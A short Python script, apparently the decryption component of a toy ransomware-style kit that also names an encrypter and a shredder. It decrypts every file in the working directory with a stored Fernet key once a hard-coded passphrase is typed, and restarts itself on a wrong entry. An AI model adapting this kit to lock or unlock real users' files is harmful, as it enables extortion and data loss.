import os
import sys
from random import randbytes
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "encrypter.py" or file == "escrkx.key" or file == "decrypter.py" or file == "shredder.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
secretphrase = "phonk"
if input("Enter Code: ") == secretphrase:

    with open("escrkx.key", "rb") as key:
        secretkey = key.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
else:
    print("Invaild")
    os.execl(sys.executable, os.path.abspath(__file__), *sys.argv)
